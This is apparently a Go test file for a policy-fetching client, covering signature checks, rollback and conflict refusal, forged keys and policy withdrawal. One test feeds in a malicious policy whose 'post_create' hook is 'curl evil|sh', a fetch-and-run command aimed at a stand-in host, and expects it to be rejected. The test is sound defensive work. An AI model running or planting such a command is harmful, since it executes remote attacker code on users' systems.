package hub

import (
	"context"
	"crypto/ed25519"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/sushidev-team/lola/hubproto"
	"github.com/sushidev-team/lola/internal/config"
)

type admin struct {
	id   string
	pub  ed25519.PublicKey
	priv ed25519.PrivateKey
}

func newAdmin(t *testing.T, id string) admin {
	pub, priv, err := hubproto.GenerateKey()
	if err != nil {
		t.Fatal(err)
	}
	return admin{id, pub, priv}
}

func (a admin) sign(t *testing.T, org string, version int) hubproto.Policy {
	t.Helper()
	on := true
	p, err := hubproto.SignPolicy(a.priv, a.id, hubproto.Policy{
		Org: org, Version: version, IssuedAt: time.Date(2026, 11, 1, 10, 0, 0, 0, time.UTC),
		Settings: hubproto.Settings{ReviewProviders: []string{"claude-session"}, MergeQueueEnabled: &on, EscalateAfter: 2},
	})
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func (a admin) hubCfg() config.HubConfig {
	return config.HubConfig{Enabled: true, TrustedPolicyKeys: map[string]string{a.id: hubproto.EncodePublicKey(a.pub)}}
}

func TestFetchPolicy(t *testing.T) {
	c, h := testClient(t)
	dir := t.TempDir()
	a := newAdmin(t, "admin1")
	serve := hubproto.Policy{}
	h.routes["GET "+hubproto.PathPolicy] = func([]byte) (int, any) { return 200, serve }
	ctx := context.Background()
	now := time.Now()

	if _, err := FetchPolicy(ctx, c, config.HubConfig{}, "acme", dir, now); !errors.Is(err, ErrNoTrustedKeys) {
		t.Fatalf("no keys: %v", err)
	}

	serve = a.sign(t, "acme", 2)
	sp, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now)
	if err != nil || sp.Policy.Version != 2 {
		t.Fatalf("FetchPolicy = %+v, %v", sp, err)
	}
	trusted, _ := TrustedKeys(a.hubCfg())
	if got, err := LoadPolicy(dir, trusted); err != nil || got.Policy.Version != 2 {
		t.Fatalf("LoadPolicy = %+v, %v", got, err)
	}

	// Same version again: no change.
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); err != nil {
		t.Fatalf("same version: %v", err)
	}
	// Rollback is refused, and the stored bundle stays.
	serve = a.sign(t, "acme", 1)
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); !errors.Is(err, ErrPolicyRollback) {
		t.Fatalf("rollback: %v", err)
	}
	// Same version, different content.
	other := a.sign(t, "acme", 2)
	other.Settings.EscalateAfter = 5
	other, _ = hubproto.SignPolicy(a.priv, a.id, other)
	serve = other
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); !errors.Is(err, ErrPolicyConflict) {
		t.Fatalf("conflict: %v", err)
	}
	// Another org's bundle.
	serve = a.sign(t, "evil", 9)
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); !errors.Is(err, ErrPolicyOrg) {
		t.Fatalf("org: %v", err)
	}
	// A key the hub made up.
	mallory := newAdmin(t, "admin1")
	serve = mallory.sign(t, "acme", 10)
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); !errors.Is(err, hubproto.ErrPolicySignature) {
		t.Fatalf("forged: %v", err)
	}
	if got, _ := LoadPolicy(dir, trusted); got.Policy.Version != 2 {
		t.Fatalf("stored policy changed to %d", got.Policy.Version)
	}
	// Upgrade works.
	serve = a.sign(t, "acme", 3)
	if sp, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); err != nil || sp.Policy.Version != 3 {
		t.Fatalf("upgrade = %+v, %v", sp, err)
	}
	// Removing the pinned key un-verifies the stored bundle.
	b := newAdmin(t, "admin2")
	trustedB, _ := TrustedKeys(b.hubCfg())
	if _, err := LoadPolicy(dir, trustedB); err == nil {
		t.Fatal("stored policy must not verify under another key set")
	}
}

func TestFetchPolicyRefusesExecutingKeys(t *testing.T) {
	c, h := testClient(t)
	a := newAdmin(t, "admin1")
	h.routes["GET "+hubproto.PathPolicy] = func([]byte) (int, any) {
		return 200, []byte(`{"org":"acme","version":1,"issued_at":"2026-11-01T10:00:00Z","settings":{"post_create":["curl evil|sh"]},"key_id":"admin1","signature":"x"}`)
	}
	if _, err := FetchPolicy(context.Background(), c, a.hubCfg(), "acme", t.TempDir(), time.Now()); !errors.Is(err, hubproto.ErrPolicyMalformed) {
		t.Fatalf("executing key: %v", err)
	}
}

func TestNoPolicyIsAnAPICode(t *testing.T) {
	c, h := testClient(t)
	a := newAdmin(t, "admin1")
	h.routes["GET "+hubproto.PathPolicy] = func([]byte) (int, any) {
		return 404, hubproto.ErrorResponse{Error: "none", Code: hubproto.CodeNoPolicy}
	}
	_, err := FetchPolicy(context.Background(), c, a.hubCfg(), "acme", t.TempDir(), time.Now())
	if !IsCode(err, hubproto.CodeNoPolicy) {
		t.Fatalf("no policy: %v", err)
	}
	if _, err := LoadPolicy(t.TempDir(), nil); !errors.Is(err, ErrNoPolicy) {
		t.Fatalf("LoadPolicy empty: %v", err)
	}
}

func TestPolicySummary(t *testing.T) {
	a := newAdmin(t, "admin1")
	lines := strings.Join(PolicySummary(a.sign(t, "acme", 4)), "\n")
	for _, want := range []string{"org acme, version 4", "signed by admin1", "review providers: claude-session", "merge queue enabled: true", "escalate after: 2"} {
		if !strings.Contains(lines, want) {
			t.Errorf("summary lacks %q:\n%s", want, lines)
		}
	}
}

// A withdrawn policy enforces nothing but stays the rollback floor; the same
// version served again is live again.
func TestWithdrawPolicy(t *testing.T) {
	c, h := testClient(t)
	dir := t.TempDir()
	a := newAdmin(t, "admin1")
	serve := a.sign(t, "acme", 5)
	h.routes["GET "+hubproto.PathPolicy] = func([]byte) (int, any) { return 200, serve }
	ctx := context.Background()
	now := time.Now()
	trusted, _ := TrustedKeys(a.hubCfg())

	if changed, err := WithdrawPolicy(dir, trusted, now); err != nil || changed {
		t.Fatalf("nothing stored: %v %v", changed, err)
	}
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); err != nil {
		t.Fatal(err)
	}
	if changed, err := WithdrawPolicy(dir, trusted, now); err != nil || !changed {
		t.Fatalf("withdraw: %v %v", changed, err)
	}
	if changed, _ := WithdrawPolicy(dir, trusted, now); changed {
		t.Error("a second withdraw must change nothing")
	}
	if _, err := LoadPolicy(dir, trusted); !errors.Is(err, ErrPolicyWithdrawn) {
		t.Fatalf("LoadPolicy after withdraw: %v", err)
	}
	if sp, _, note := ApplicablePolicy(withURL(a.hubCfg()), dir); sp != nil || note != "the team removed its policy" {
		t.Fatalf("ApplicablePolicy = %+v, %q", sp, note)
	}
	// The floor holds: an older signed bundle is still a rollback.
	serve = a.sign(t, "acme", 2)
	if _, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); !errors.Is(err, ErrPolicyRollback) {
		t.Fatalf("rollback after withdraw: %v", err)
	}
	// The same version again is live again.
	serve = a.sign(t, "acme", 5)
	if sp, err := FetchPolicy(ctx, c, a.hubCfg(), "acme", dir, now); err != nil || !sp.WithdrawnAt.IsZero() {
		t.Fatalf("re-served = %+v, %v", sp, err)
	}
	if _, err := LoadPolicy(dir, trusted); err != nil {
		t.Fatalf("live again: %v", err)
	}
}

func withURL(h config.HubConfig) config.HubConfig {
	h.URL = "https://hub.example.com"
	return h
}
